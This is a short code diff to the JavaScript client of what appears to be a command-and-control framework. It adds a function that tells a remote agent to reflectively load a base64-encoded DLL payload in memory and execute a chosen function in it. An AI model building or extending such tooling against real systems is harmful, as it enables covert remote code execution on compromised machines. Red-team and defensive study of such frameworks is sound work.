@@ -342,5 +342,19 @@ export function groupAgent(agentId, groupName) {
     });
 }
 
-// Don't automatically connect when module is imported
-// Let the App.vue component handle this instead
+/**
+ * Executes reflective loading of a DLL on a target agent
+ * @param {string} agentId - The ID of the target agent
+ * @param {string} payload - Base64-encoded DLL payload
+ * @param {string} functionName - Name of the function to execute
+ * @returns {boolean} - True if message was sent successfully
+ */
+export function executeReflectiveLoading(agentId, payload, functionName) {
+    console.log(`CLIENT → SERVER: Initiating reflective loading of function "${functionName}" on agent ${agentId}`);
+    return sendMessage({
+        type: 'executeReflectiveLoading',
+        agentId,
+        payload,
+        functionName
+    });
+}
